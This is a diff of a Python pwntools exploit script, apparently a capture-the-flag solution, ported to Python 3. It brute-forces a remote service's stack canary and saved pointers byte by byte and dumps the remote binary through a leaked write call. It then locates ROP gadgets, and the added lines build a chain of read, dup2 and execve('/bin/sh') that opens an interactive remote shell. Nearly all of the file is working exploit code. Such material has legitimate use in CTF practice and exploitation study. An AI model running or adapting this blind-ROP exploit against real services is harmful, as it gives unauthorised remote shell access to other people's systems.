@@ -22,187 +22,185 @@ if len(sys.argv) > 2:
 #              to dump enough of the raw binary to know what functions are where.
 
 
-def save(label, record):
+def cache_save(label, record):
 
-	data = load()
-	if data is None:
-		data = {}
+    data = cache_load()
+    if data is None:
+        data = {}
 
-	data[label] = record
+    data[label] = record
 
-	with open('cache.pickle', 'wb') as f:
-		pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)
-
-
-def load(label=None):
-
-	if os.path.exists('cache.pickle'):
-		with open('cache.pickle', 'rb') as f:
-			data = pickle.load(f)
-
-			if label:
-				if label in data:
-					return data[label]
-			else:
-				return data
-
-	return None
+    with open('cache.pickle', 'wb') as f:
+        pickle.dump(data, f, protocol=pickle.HIGHEST_PROTOCOL)
 
 
-def dump(prefix, size, label='data'):
+def cache_load(label=None):
 
-	data = load(label)
-	if data is None:
+    if os.path.exists('cache.pickle'):
+        with open('cache.pickle', 'rb') as f:
+            data = pickle.load(f)
 
-		data = ''
-		while len(data) < size:
-			for c in range(0x100):
+            if label:
+                if label in data:
+                    return data[label]
+            else:
+                return data
 
-				if c == 0x0a:
-					continue
+    return None
 
-				try:
 
-					byte = chr(c)
+def cache_dump(prefix, size, label='data'):
 
-					log.info('trying: 0x%02x at position %d (%s: %s)' % (c, len(data), label, data.encode('hex')))
-					io = remote(HOST, PORT)
+    data = cache_load(label)
+    if data is None:
 
-					io.recvuntil(': ')
-					io.sendline(prefix+data+byte)
-					line = io.recvline()
-					io.close()
+        data = b''
+        while len(data) < size:
+            for c in range(0x100):
 
-					if 'darkest' in line:
-						data += byte
-						log.success('%s: %s' % (label, data.encode('hex')))
-						break
+                if c == 0x0a:
+                    continue
 
-				except:
-					io.close()
+                try:
 
-		save(label, data)
+                    byte = bytes([c])
 
-	return data
+                    log.info('trying: %#04x at position %d (%s: %s)', c, len(data), label, data.hex())
+                    io = remote(HOST, PORT, level='warn')
+
+                    io.recvuntil(': ')
+                    io.sendline(prefix+data+byte)
+                    line = io.recvline()
+                    io.close()
+
+                    if b'darkest' in line:
+                        data += byte
+                        log.success('%s: %s', label, data.hex())
+                        break
+
+                except EOFError:
+                    io.close()
+
+        cache_save(label, data)
+
+    return data
 
 
 # step 1: find the size of the buffer
-size = load('size')
+size = cache_load('size')
 if size is None:
-	for i in range(0x08, 0x200):
-		try:
-			io = remote(HOST, PORT)
+    for i in range(0x08, 0x200):
+        try:
+            io = remote(HOST, PORT, level='warn')
 
-			if i == 0:
-				print io.recvuntil('\nbuf')[:-5]
+            if i == 0:
+                print(io.recvuntil(b'\nbuf')[:-5])
 
-			log.info('size: %d?' % i)
-			io.recvuntil(': ')
-			io.sendline('x'*i)
-			io.recvline()
-			io.close()
+            log.info('size: %d?' % i)
+            io.recvuntil(b': ')
+            io.sendline('x'*i)
+            io.recvline()
+            io.close()
 
-		except:
-
-			io.close()
-
-			size = i-1
-			save('size', size)
-			break
+        except EOFError:
+            io.close()
+            size = i-1
+            cache_save('size', size)
+            break
 
 # setup the prefix we will append data to as we go
-prefix  = 'x'*size
+prefix  = b'A'*size
 
 # dump the canary
-canary  = dump(prefix, 4, 'canary')
+canary  = cache_dump(prefix, 4, 'canary')
 prefix += canary
 canary  = u32(canary)
 
-log.success('canary: 0x%08x' % canary)
+log.success('canary: %#010x', canary)
 
 # dump the .data section pointer
-ddata   = dump(prefix, 4, '.data')
+ddata   = cache_dump(prefix, 4, '.data')
 prefix += ddata
 ddata   = u32(ddata)
 
-log.success('.data:  0x%08x' % ddata)
+log.success('.data:  %#010x', ddata)
 
 # dump alignment bytes
-prefix += dump(prefix, 4, 'align')
+prefix += cache_dump(prefix, 4, 'align')
 
 # dump the saved base pointer
-ebp     = dump(prefix, 4, 'ebp')
+ebp     = cache_dump(prefix, 4, 'ebp')
 prefix += ebp
 ebp     = u32(ebp)
 
-log.success('stack:  0x%08x' % ebp)
+log.success('stack:  %#010x', ebp)
 
 # dump the saved instruction pointer
-ret     = dump(prefix, 4, 'ret')
+ret     = cache_dump(prefix, 4, 'ret')
 #prefix += ret
 ret     = u32(ret)
 
-log.success('return: 0x%08x' % ret)
+log.success('return: %#010x', ret)
 
 # hunt down a way to leak the binary, we pass arguments on the stack so it
 # is fairly easy to just look for a write or send call (similar args) with
 # a known address.
 
-addr = load('addr')
+addr = cache_load('addr')
 if addr is None:
-	for i in range(-256, 256):
-		try:
-			io = remote(HOST, PORT)
+    for i in range(-256, 256):
+        try:
+            io = remote(HOST, PORT, level='warn')
 
-			addr = ret+i
-			log.info('addr: 0x%08x' % (addr))
-			io.recvuntil(': ')
-			io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000)+p32(0x100))
-			line = io.recvline()
+            addr = ret+i
+            log.info('addr: %#010x', addr)
+            io.recvuntil(': ')
+            io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000)+p32(0x100))
+            line = io.recvline()
 
-			io.close()
-			
-			if 'ELF' in line:
-				save('addr', addr)
-				break
+            io.close()
+            
+            if b'ELF' in line:
+                cache_save('addr', addr)
+                break
 
-		except:
+        except EOFError:
+            io.close()
 
-			io.close()
+log.success('write: %#010x', addr)
 
-log.success('write: 0x%08x' % addr)
-
-data = ''
+data = b''
 for i in range(0, 0x100000, 0x1000):
-	try:
-		io = remote(HOST, PORT)
+    try:
+        io = remote(HOST, PORT, level='warn')
 
-		log.info('dumping: 0x%08x' % (addr+i))
-		io.recvuntil(': ')
-		io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000+i)+p32(0x1000))
-		chunk = io.recvn(0x1000)
+        log.info('dumping: %#010x', 0x08048000+i)
+        io.recvuntil(': ')
+        io.sendline(prefix+p32(addr)+p32(0x04)+p32(0x08048000+i)+p32(0x1000))
+        chunk = io.recvn(0x1000)
+        #print(len(chunk))
 
-		data += chunk
+        data += chunk
 
-		if len(chunk) < 0x1000:
-			break
+        if len(chunk) < 0x1000:
+            break
 
-		io.close()
+        io.close()
 
-	except:
-
-		io.close()
+    except EOFError:
+        data += b'\x00'*0x1000
+        io.close()
 
 with open('dump.bin', 'wb') as f:
-	f.write(data)
-	log.success('wrote %d bytes to %s' % (len(data), 'dump.bin'))
+    f.write(data)
+    log.success('wrote %d bytes to %s', len(data), 'dump.bin')
 
 # now lets hunt for gadgets
 gadgets = [
-    { 'opcode': '\x58\xc3',     'mnemonic': 'pop eax; ret',            'addr': 0 },
-    { 'opcode': '\x59\x5b\xc3', 'mnemonic': 'pop ecx ; pop ebx ; ret', 'addr': 0 },
-    { 'opcode': '\x5a\xc3',     'mnemonic': 'pop edx; ret',            'addr': 0 },
-    { 'opcode': '\xcd\x80\xc3', 'mnemonic': 'int 0x80; ret',           'addr': 0 },
+    { 'opcode': bytes.fromhex('58c3'),   'mnemonic': 'pop eax; ret',            'addr': 0 },
+    { 'opcode': bytes.fromhex('595bc3'), 'mnemonic': 'pop ecx ; pop ebx ; ret', 'addr': 0 },
+    { 'opcode': bytes.fromhex('5ac3'),   'mnemonic': 'pop edx; ret',            'addr': 0 },
+    { 'opcode': bytes.fromhex('cd80c3'), 'mnemonic': 'int 0x80; ret',           'addr': 0 },
 ]
 
 found = 0
@@ -213,14 +211,64 @@ for gadget in gadgets:
         found += 1
 
 if len(gadgets) != found:
-	log.error('could not find all gadgets')
+    log.error('could not find all gadgets')
 
 
 for gadget in gadgets:
-	log.info('gadget: %s => 0x%08x' % (gadget['mnemonic'], gadget['addr']))
+    log.info('gadget: %s => %#010x', gadget['mnemonic'], gadget['addr'])
 
 # build the rop chain
-#rop  = p32()
+ropchain = b''
 
-sys.exit(0)
-io.interactive()
+# sys_read(0, .data, len("/bin/sh\0"))
+ropchain += p32(gadgets[0]['addr'])
+ropchain += p32(0x03) # eax
+ropchain += p32(gadgets[1]['addr'])
+ropchain += p32(ebp-100) # ecx
+ropchain += p32(4) # ebx
+ropchain += p32(gadgets[2]['addr'])
+ropchain += p32(len('/bin/sh\0')) # edx
+ropchain += p32(gadgets[3]['addr'])
+
+# sys_dup2(4, 0)
+ropchain += p32(gadgets[0]['addr'])
+ropchain += p32(0x3F) # eax
+ropchain += p32(gadgets[1]['addr'])
+ropchain += p32(0) # ecx
+ropchain += p32(4) # ebx
+ropchain += p32(gadgets[3]['addr'])
+
+# sys_dup2(4, 1)
+ropchain += p32(gadgets[0]['addr'])
+ropchain += p32(0x3F) # eax
+ropchain += p32(gadgets[1]['addr'])
+ropchain += p32(1) # ecx
+ropchain += p32(4) # ebx
+ropchain += p32(gadgets[3]['addr'])
+
+# sys_execve(.data, NULL, NULL)
+ropchain += p32(gadgets[0]['addr'])
+ropchain += p32(0x0B) # eax
+ropchain += p32(gadgets[1]['addr'])
+ropchain += p32(0) # ecx
+ropchain += p32(ebp-100) # ebx
+ropchain += p32(gadgets[2]['addr'])
+ropchain += p32(0) # edx
+ropchain += p32(gadgets[3]['addr'])
+
+
+io = remote(HOST, PORT, level='warn')
+io.recvuntil(b'buffer:')
+io.sendline(prefix + ropchain)
+io.send(b'/bin/sh\0')
+
+# Shell
+io.sendline(b'id')
+id_result = io.recvline()
+if b'uid=' in id_result:
+    log.success('Shell: %s', id_result.decode('ascii').strip())
+    if not os.environ.get('HEALTH_CHECK', False):
+        io.interactive()
+    sys.exit(0)
+else:
+    sys.exit(1)
